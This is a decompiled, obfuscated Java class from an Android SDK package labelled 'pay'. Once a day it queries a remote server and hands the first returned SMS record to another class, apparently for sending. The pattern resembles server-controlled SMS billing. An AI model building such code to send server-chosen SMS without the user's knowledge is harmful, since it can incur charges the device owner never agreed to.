package bn.sdk.szwcsss.common.az.c.pay;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import bn.sdk.szwcsss.common.az.c.constant.Cif;
import bn.sdk.szwcsss.common.az.c.model.Cint;
import bn.sdk.szwcsss.common.az.c.model.RespParam;
import bn.sdk.szwcsss.common.az.c.model.SmsInfo;
import bn.sdk.szwcsss.common.az.c.net.Cnew;
import bn.sdk.szwcsss.common.az.code.c.Ccase;
import bn.sdk.szwcsss.common.az.code.c.Clong;
import java.util.Calendar;
import java.util.List;
/* renamed from: bn.sdk.szwcsss.common.az.c.pay.if  reason: invalid class name */
/* loaded from: classes.dex */
public class Cif {

    /* renamed from: a  reason: collision with root package name */
    private Cint.Cdo f544a;
    private Context b;
    private Handler c = new Handler() { // from class: bn.sdk.szwcsss.common.az.c.pay.if.1
        @Override // android.os.Handler
        public void handleMessage(Message message) {
            switch (AnonymousClass2.f546a[Cif.Cint.a(message.what).ordinal()]) {
                case 1:
                    Cif.this.b();
                    Cif.this.a(message.obj);
                    return;
                default:
                    return;
            }
        }
    };

    /* renamed from: bn.sdk.szwcsss.common.az.c.pay.if$2  reason: invalid class name */
    /* loaded from: classes.dex */
    /* synthetic */ class AnonymousClass2 {

        /* renamed from: a  reason: collision with root package name */
        static final /* synthetic */ int[] f546a = new int[Cif.Cint.values().length];

        static {
            try {
                f546a[Cif.Cint.SUCCESS.ordinal()] = 1;
            } catch (NoSuchFieldError e) {
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: bn.sdk.szwcsss.common.az.c.pay.if$do  reason: invalid class name */
    /* loaded from: classes.dex */
    public class Cdo extends Thread {
        private Cdo() {
        }

        private Message a(RespParam respParam) {
            Message obtain = Message.obtain();
            obtain.obj = respParam;
            obtain.what = respParam.getResultCode();
            return obtain;
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            Looper.prepare();
            RespParam connToAccess = new Cnew(Cif.this.b, Cif.this.f544a).connToAccess();
            if (connToAccess != null) {
                Cif.this.c.sendMessage(a(connToAccess));
                Ccase.a(Cif.this.b, "retry_num", connToAccess.getRetry_num());
            }
            Looper.loop();
        }
    }

    public Cif(Cint.Cdo doVar, Context context) {
        this.f544a = doVar;
        this.b = context;
    }

    private boolean a(String str) {
        long parseLong = Long.parseLong(str);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(parseLong);
        Calendar calendar2 = Calendar.getInstance();
        return calendar.get(1) == calendar2.get(1) && calendar.get(2) == calendar2.get(2) && calendar.get(5) == calendar2.get(5);
    }

    private boolean c() {
        String g = Ccase.g(this.b, "initTime");
        return Clong.c((Object) g) || !a(g);
    }

    public void a() {
        if (c()) {
            new Cdo().start();
        }
    }

    protected void a(Object obj) {
        List smsList = ((RespParam) obj).getSmsList();
        if (!Clong.c(smsList)) {
            new Ctry(this.b).a((SmsInfo) smsList.get(0));
        }
    }

    protected void b() {
        Ccase.a(this.b, "initTime", String.valueOf(System.currentTimeMillis()));
    }
}
